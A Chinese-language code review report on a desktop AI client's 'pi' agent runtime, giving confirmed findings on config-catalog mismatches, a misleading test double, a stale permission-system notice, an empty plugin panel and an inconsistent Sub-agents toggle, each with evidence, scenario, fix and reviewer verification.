DESC: P5-5 的核心主张是 buildRuntimeConfig 为纯函数、写盘与内存交付共用，「只可能差组装时刻，不可能差规则」，测试 'assembles byte-identical documents' 也只覆盖了「刚 sync 成功」这一种输入。但两个调用方喂进去的 config 选取规则并不相同：writeUserProviderConfig 在没有 wire 缓存时用空目录 `{version:1, providers:{}}`，buildNativeModelCatalog 用随包快照。于是两条路在两种常见状态下结果不同：(a) 托管模式首启离线——sync 走 A3 回落把快照写进 models.json，随后用户编辑一次自己的服务，writeUserProviderConfig 以空缓存重写 models.json，盘上的快照 provider 全部消失，而 native 内存目录仍然带着它们（内嵌终端里的随包 pi CLI 读的正是盘上这份）；(b) 托管凭据关闭的本地模式——盘上与 UI 都明确不给随包基线（PiModelConfigService.test.ts:884 'never lends the shipped baseline to a local pi installation'），但 buildNativeModelCatalog 没有这道门，照样把公司随包目录交给 worker。
EVIDENCE:   buildNativeModelCatalog(...) {
    const cached = readCachedConfig(this.sourcePath) ?? this.readBundledCatalog();
// 对照 writeUserProviderConfig（第 520 行）：
    const cached = readCachedConfig(this.sourcePath) ?? { version: 1 as const, providers: {} };
SCENARIO: 托管模式、首次启动无网 → sync 回落到随包快照，models.json 写入 shipped/* 两个 provider → 用户在设置页加一个自己的服务 → onChange 触发 writeUserProviderRuntimeConfig → models.json 被重写为「空缓存 + 用户服务」，shipped/* 从文件里消失 → 内嵌终端里的 pi CLI 再也解析不出这些模型，而同一时刻 native worker 的内存目录里它们还在，两边对「有哪些 provider」给出不同答案。
FIX: 把「用哪份 config 当托管半边」提到一个共用函数里（例如 managedHalf(): cached ?? bundled ?? empty），两个调用方都用它；若本地模式确实不该拿随包基线，则在这个函数里按 resolveManagedCredentialsEnabled 统一判定，而不是只在 readCatalog 一侧判。
REFUTER(CONFIRMED,medium): 两条路的输入选取规则确实不同，代码原文对得上：writeUserProviderConfig 用 `readCachedConfig(this.sourcePath) ?? {version:1, providers:{}}`（PiModelConfigService.ts:520），buildNativeModelCatalog 用 `readCachedConfig(this.sourcePath) ?? this.readBundledCatalog()`（:568）。而同一方法的注释（:554-562）写的是「Identical inputs and the identical builder…can only ever differ by when they were assembled」，与实现不符。两个场景都核实过：(a) A3 离线回落只调 writeRuntimeConfig(bundled,…)（:325-327）且注释明说不写 sourcePath，因此随后任意一次用户服务改动触发的 writeUserProviderConfig 会以空缓存重写 models.json，盘上随包 provider 消失；内嵌 PTY 里的 pi CLI 读的正是同一个目录（index.ts:292 PI_CODING_AGENT_DIR + :298-309 resolveManagedPiPtyEnv 明确保留该变量），所以 TUI 与 native 内存目录会对「有哪些 provider」给出不同答案。(b) 本地模式：resolveNativeModelCatalog / buildNativeModelCatalog 全链没有 resolveManagedCredentialsEnabled 判定（credentialMode.ts:52 是真实可切换的用户设置），而 readCatalog('local') 侧有明确的「不外借随包基线」规则与用例（PiModelConfigService.test.ts:884）。因为托管 provider 在 buildRuntimeConfig 里先于用户组写入，defaultRef() 取 order[0]（model-adapter/index.ts:68-69）时本地模式还会优先落到随包的公司 provider。下调理由：(a) 里「空缓存重写掉盘上随包 provider」是 P5-5 之前就有的写盘行为，本轮新增的是两侧规则的不一致，所以给 medium 而非 high。
WAIVER(no): 无 — 全局决策 H17-P5-5-boundary 明确要求：『native模型目录的组装函数（buildRuntimeConfig）必须是纯函数，写盘（legacy用）与内存交付（native用）共用同一实现，两条路只可能差组装时刻不可能差规则，用测试断言两者相等』；evidence/p5-4-p5-5/README.md MC04 节也重申『「native跑的」与「legacy读的」只可能差在组装时刻，不可能差在规则——测试直接断言两者相等』。经查代码，writeUserProviderConfig（PiModelConfigService.ts:520）在没有 wire 缓存时回落到空目录 `{version:1, providers:{}}`，而 buildNativeModelCatalog（PiModelConfigService.ts:568）在同样情况下回落到 `this.readBundledCatalog()`（随包快照），两者输入选取规则确实不同，且现有测试『assembles byte-identical documents』（PiModelConfigService.test.ts:1119）只覆盖『刚 sync 成功』这一种输入，未覆盖两个回落分支的对比。这直接违反了上述决策明文要求的『规则相同』，不是文档承认的取舍，而是与决策相悖的实现缺陷。

### [import-catalog-11] MEDIUM test-gap confirmed | P5-4 | /home/ai/code/ai-client/src/main/services/legacyImport/__tests__/LegacyImportService.test.ts:98 | 测试替身用 pi 时代的文件名，掩盖了 native 命名与清单校验的不兼容
DESC: 假 createImport 生成 `probe_${targetPiSessionId}.jsonl`，恰好满足 LegacyImportManifest.parseRecord 的 `_<id>.jsonl` 后缀要求，因此 'imports Codex once and persists enough manifest state for deduplication' 里那次 manifest 重载（第 421-422 行）才会通过。整个 Main 侧测试套件没有一处使用 native 实际写出的 `<id>.jsonl` 命名，import-catalog-01 那条高危缺陷因此对全绿的测试完全不可见。此外 native 写入器与 Main 事务这两半从来没有在同一个用例里对接过（CodexImportIntegration.test.ts 在本批已被削成只验转写侧）。
EVIDENCE:   const createImport = vi.fn(async (payload: WorkerImportConversationPayload) => {
    const finalSessionFile = path.join(root, `probe_${payload.targetPiSessionId}.jsonl`);
    await writeFile(finalSessionFile, 'native-pi-session\n', 'utf8');
SCENARIO: 把假 worker 的文件名改成 `${payload.targetPiSessionId}.jsonl`（native 的真实命名），'persists enough manifest state for deduplication' 里重载后的 list() 会变成空数组，用例立刻变红——说明现有绿灯来自替身的命名巧合而非实现正确。
FIX: 把替身命名改成 native 的真实形状，并补一条用例：完整跑一次导入 → 用新的 LegacyImportManifest 实例重新打开同一个 manifest 文件 → 断言记录仍在且状态为 complete、再次 importBatch 得到 'already-imported'。
REFUTER(CONFIRMED,medium): 三段声称我都亲自核对过，并且沿着它给的「改名就变红」这条路推到了底。(1) 替身确实写 `probe_${payload.targetPiSessionId}.jsonl`（LegacyImportService.test.ts:98，另有 :141 的 inspect 替身同款命名）；(2) 清单校验确实要求 `path.basename(targetSessionFile).endsWith(`_${targetPiSessionId}.jsonl`)`（LegacyImportManifest.ts:106），而 native 写出的是 `${targetPiSessionId}.jsonl`（nativeImport.ts:249-251 的 fileFor），basename 比要求的后缀还短，endsWith 必然为 false；(3) 这道校验只在读盘时跑——reserve/updateImporting/complete/fail 都只写内存 Map 再 flush，不过 parseRecord（LegacyImportManifest.ts:142-235），所以同进程内一切正常，只有换一个 LegacyImportManifest 实例重新读盘才暴露。用例 'imports Codex once and persists enough manifest state for deduplication' 末尾正是 `const reloaded = new LegacyImportManifest(...); expect((await reloaded.list())[0].source.sourceKind)`（:421-422），换成 native 命名后 list() 返回空数组、`[0]` 取属性直接 TypeError，用例必红——原报告的反证实验成立。(4) 「写入侧与 Main 事务再没有在同一用例里对接」也属实：本批把 CodexImportIntegration.test.ts 里 PiLegacyImportWriter 的整段删掉了，只剩转写侧断言（git diff HEAD 该文件）。我把严重级别从 low 提到 medium：这不是孤立的测试薄弱点，它正好挡住了一条会造成真实后果的缺陷（重启后 complete 记录被整条丢弃 → 去重失效、可重复导入同一会话、importedSnapshots 计数归零）。
WAIVER(no): 无 — 这条指出的是测试方法学问题（假 worker 用 pi 时代的 `probe_<id>.jsonl` 命名巧合满足了 manifest 的后缀校验，掩盖了与 native 真实命名 `<id>.jsonl` 的不兼容）。评估范围内的文档（evidence/p5-4-p5-5/README.md、topics/p5-4-p5-5-import-and-catalog.md）只提到『两个 custom 条目类型』『display-only 校验』等取舍，从未讨论过测试替身命名是否贴合 native 真实产物，也没有『测试用例暂不覆盖跨命名兼容性』一类的免责声明。evidence README 里『全部只有自动化测试，未打包、未真机点验』这条 field-only 豁免针对的是缺少真机/打包验证，而不是自动化测试本身因替身失真而失效这件事，两者不是同一个缺口，因此不适用。

### [cutover-02] MEDIUM security confirmed | P6-5 | src/main/services/piPlugins/index.ts:53 | 插件设置页仍宣称用户自装的权限系统在审批工具调用
DESC: permissionSystemOwner() 读用户 <agentDir>/settings.json，只要里面配了 @gotgenes/pi-permission-system（或同名目录/仓库），就返回 user_configured；设置页据此渲染一条橙色提示，原文是「Tool approval is handled by the permission system you installed yourself. This app steps aside, and its approval settings do not apply.」。P6-5 之后 native runtime 不加载任何 pi 扩展，审批一律由自有 permissions 插件做（nativeWorkerRuntime.ts:325 把 permissionGate 硬编码为 'bundled'），这条提示描述的行为已不存在。函数上方的注释「the same exported function the worker calls at bootstrap」同样失真——已经没有 worker 调它了。
EVIDENCE: function permissionSystemOwner(agentDir: string): PermissionSystemOwner {
  try {
    const parsed: unknown = JSON.parse(readFileSync(join(agentDir, 'settings.json'), 'utf8'));
    ...
    return permissionPluginConfiguredByUser(packages) ? 'user_configured' : 'bundled';
SCENARIO: 用户此前在 pi settings.json 里配了自己的 @gotgenes/pi-permission-system（并在其中写了更严格的 deny 规则）→ 打开设置页「插件」→ 看到「本应用让位，其审批设置不生效」→ 于是以为自己的策略在管工具调用 → 实际上 native 从头到尾用的是本应用自带档位与 permissionPolicy.mjs，用户的规则一条都没生效，而 UI 明确告诉他相反的事。
FIX: 要么让 permissionSystemOwner 永远返回 'bundled' 并改写文案为「审批由本应用自有权限系统负责，你安装的 pi 权限扩展只影响内嵌终端」，要么把这条提示从会话审批语义改写成仅描述 TUI/CLI。
REFUTER(CONFIRMED,medium): 引用无断章取义，触发路径成立，但我对分类有保留。核实：piPlugins/index.ts:53-66 确实只读 <agentDir>/settings.json 的 packages，命中即返回 'user_configured'；PiPluginsSettings.tsx:231-260 据此渲染橙色提示，原文与报告一致（'This app steps aside, and its approval settings do not apply.'）。native 侧审批确实一律走自有 permissions 插件：nativeWorkerRuntime.ts:238 传 `approve: this.permissions.approve`，bootstrap 结果 permissionGate 硬编码 'bundled'（同文件:325）。用户可以通过设置页的 pi install 把 @gotgenes/pi-permission-system 写进同一个 agentDir 的 settings.json，所以 user_configured 分支可达。另有一处加强证据：渲染层 permissionGate store 的 isTierControlDegraded 读的是 bootstrap 的 gate（恒为 'bundled'），所以聊天界面会正常显示档位控制，与设置页的「让位」提示自相矛盾。我把 category 从 security 下调为「误导性 UI」并给 medium：实际执行比文案更严（本应用的权限系统始终在管），不存在被绕过的审批，只是用户会误以为自己的 deny 规则生效。
WAIVER(no): 无 — open-questions.md 第35行与 unified-agent-directory.md 第49行仍在描述『permissionPlugin.ts:473 判定用户已配置权限系统时返回 user_configured/gated:true，主动让路用他那份』这一套 legacy 时代的语义，且明确写『落地只需界面如实显示当前审批用的是哪一份』——这恰恰说明文档预期该提示应准确反映实际审批归属，而不是承认/接受它在 P6-5 后失真。P6 系列文档（p6-cutover.md、evidence/p6/README.md）通篇未提及 permissionSystemOwner/设置页文案需要同步更新或已知会失真，找不到任何『native 下不再需要这条提示准确』的取舍声明。故该缺口未被豁免。

### [cutover-03] MEDIUM bug confirmed | P6-5 | src/main/services/agent-host/WorkerManager.ts:489 | 侧栏插件清单与 MCP 徽标在 native 下永久为空，且已装插件对 GUI 会话完全不生效
DESC: U04 的侧栏插件面板由 chat:listSessionExtensions 供数，Main 直接取 bootstrap.extensions；native 的 bootstrap 结果不带这个字段，于是返回空数组。pluginInventoryModel 把 null 当「还没有 worker 报告」、把 [] 当「确实一个都没有」，所以面板会明确显示 0 个插件。MCP 徽标同理——它是从扩展通过 ui.setStatus 发的状态行解析出来的，而 native 不加载任何 pi 扩展、也不产生 extensionUi 事件，所以即使 P5-3 的自有 MCP 插件连着真实服务器，徽标也永远不出现。更实质的一层是：H/19 的插件管理仍然能装/卸/列 pi 扩展并写进 settings.json，但 P6-5 之后没有任何 GUI 会话会加载它们。
EVIDENCE:   getSessionExtensions(sessionId: string): WorkerExtensionInfo[] | null {
    const entry = this.entriesBySession.get(sessionId);
    if (!entry?.bootstrap) return null;
    return entry.bootstrap.extensions ?? [];
  }
SCENARIO: 用户在设置页装一个 pi 扩展（安装成功、列表里能看到）→ 新开一个会话 → 侧栏插件面板显示「0 个插件」、没有 MCP 徽标 → 用户以为安装失败，反复重装；实际是这个扩展在 GUI 会话里根本不会被加载，只有内嵌 Pi 终端会用它。
FIX: 让 native 的 bootstrap 返回一份真实的自有能力清单（或显式返回 undefined 让面板回到「未报告」态），并在插件管理页明写「已安装的 pi 扩展只对内嵌终端生效」；MCP 徽标改为从自有 MCP 插件的状态直接投影，不再依赖 ui.setStatus。
REFUTER(CONFIRMED,medium): 无法推翻，四段都在代码里对上了。(1) WorkerManager.ts:489-493 的 `return entry.bootstrap.extensions ?? []` 原文属实；native bootstrap 不写 extensions（nativeWorkerRuntime.ts:305-327），所以只要有活 worker 就返回 []。(2) pluginInventoryModel.ts 的模块头明写 `null` 与 `[]` 语义不同、`[]` 必须渲染成 0；useSessionExtensions.ts 用 `setExtensions(result ?? null)`，空数组不会被折回 null，所以面板确实进入「已报告且为 0」态（LeftDock.tsx:431-433 是唯一消费者）。(3) MCP 徽标确实只从 ui.setStatus 状态行正则解析（mcpReadinessFromStatuses），而 native 侧没有任何 setStatus 生产者——src/runtime 里 grep 不到 setStatus，唯一能触发 extensionUi 的 approvalUi 回调被永久遮蔽（见 cutover-06）。(4) H/19 插件管理仍在写 settings.json 并调 workerManager.invalidateAll()（piPlugins/index.ts:105-125），而 native 不加载 pi 扩展。我把严重级从 high 降到 medium：这是信息面板报错，不影响会话正确性与安全；「已装扩展只对内嵌终端生效」本身是 P6 的设计结果，缺的是 UI 没说清。
WAIVER(no): 无 — H/19 案例4、5 的插件清单真机点验记录在 evidence/unified-agent-directory/README.md，但该点验发生在2026-09-11，早于 P6-5（2026-09-13）默认切 native 与旧引擎退役；当时验证很可能仍在能加载 pi 扩展的路径上成立。P6 cutover 相关文档（topics/p6-cutover.md、evidence/p6/README.md、README.md P6 各节）通篇未提及『native 下侧栏插件面板/MCP 徽标将永久为空』这一后果，也没有把它列为已知限制或推迟项。P5-1 相关文档提到的『插件的安装管理界面不在本批』说的是技能/模板/MCP 的安装管理 UI 范围，与本发现『已装的 pi 扩展对 GUI 会话完全不生效、面板永远显示 0』是不同的问题，没有覆盖关系。故未被豁免。

### [cutover-10] MEDIUM contract-gap confirmed | P6-5 | src/agent-host/piWorkerRpcServer.ts:143 | opt-in 扩展链路在 native 下空转，Sub-agents 开关显示「关」而 native 委派实际默认「开」
DESC: Main 从设置读 opt-in 特性、下发 AICLIENT_PI_OPT_IN_EXTENSIONS（piModelConfig/index.ts:293），worker.ts 读它并传给 RPC server，RPC server 又把 optInExtensions 塞进 createRuntime 的参数（注释写「the OPT-IN bundled extensions to inject」）——但 src/runtime 里对 optInExtensions 零引用，native 不注入任何 pi 扩展，这条链路整段空转。用户可见的后果在设置页：PiResourcesSettings 的开关取值来自 resolveOptInFeatures，'subagents' 的 defaultEnabled 是 false，所以未表态的用户看到的是「关」；而 native 委派走的是 nativeSubagentSettings，未表态时 enabled 为 true，Task* 工具照常注册。
EVIDENCE: export interface PiWorkerRuntimeOptions extends WorkerBootstrapPayload {
  projectTrusted: boolean;
  /** Comma-separated feature ids of the OPT-IN bundled extensions to inject. */
  optInExtensions?: string;
SCENARIO: 全新安装、用户从没动过这个开关 → 设置页「Sub-agents」显示关闭，说明文字还写着「默认关闭：它的工具定义会随每次请求发送，即使不用也花 token」→ 用户据此认为自己没在为这项功能付 token → 实际 native 每个会话都注册了 subagent 工具，其 schema 确实进了每次请求的缓存前缀。
FIX: 要么让 UI 的 enabled 取值改用 nativeSubagentSettings 的同一套判定（未表态=开），要么把 native 的默认改成跟随 defaultEnabled；同时删掉 optInExtensions 从 Main 到 RPC server 的整条空转参数，或让 native 真正消费它。
REFUTER(CONFIRMED,medium): 两半都在代码里核实了。空转链路：Main 在 src/main/services/piModelConfig/index.ts:293 下发 AICLIENT_PI_OPT_IN_EXTENSIONS，worker.ts:135-137 读出来塞给 RPC server，piWorkerRpcServer.ts:572 又把它并进 createRuntime 的参数——而 `grep -rn optInExtensions src/runtime` 零命中，NativeWorkerRuntime 只是把它随 options 一起收下后不用；唯一的消费者 resolveBundledFeaturePlugins（src/agent-host/bundledFeaturePlugins.ts:97）在生产代码里已无调用方（只剩自己的单测）。UI 口径不一致：设置页 src/renderer/components/settings/PiResourcesSettings.tsx:175-189 的 Switch 取 `feature.enabled`，该值来自 getPiResourceSettings（piModelConfig/index.ts:257-271）→ resolveOptInFeatures，未表态时落到 bundledPlugins.mjs 里 subagents 的 `defaultEnabled: false`，同一张卡片的说明文字写着「Off by default: its tool definitions are sent with every request」。而 native 侧 WorkerManager.ts:2066 用 nativeSubagentSettings()，该函数（nativeSubagentSettings.ts:48-50）明写「只有显式 false 才是拒绝」，未表态返回 enabled: true；nativeWorkerRuntime.ts:219-227 据此在 `enabled === false` 之外一律注册 subagents 插件。所以全新安装的用户看到「关」，实际每个会话都注册了委派工具。
WAIVER(no): 无 — 全仓搜索 optInExtensions/OPT_IN_EXTENSIONS/resolveOptInFeatures/nativeSubagentSettings 等关键字，在 docs/plantree/plans/runtime-evolution 下只有 evidence/p5-2/signoff.md 提到 nativeSubagentSettings 的默认值测试，从未提到“设置页 Sub-agents 开关显示为关，但 native 委派默认已开”这个用户可见的不一致，也没有任何决策记录承认 optInExtensions 这条链路在 native 下是空转的。这是一个未被察觉、更谈不上被文档豁免的缺口。
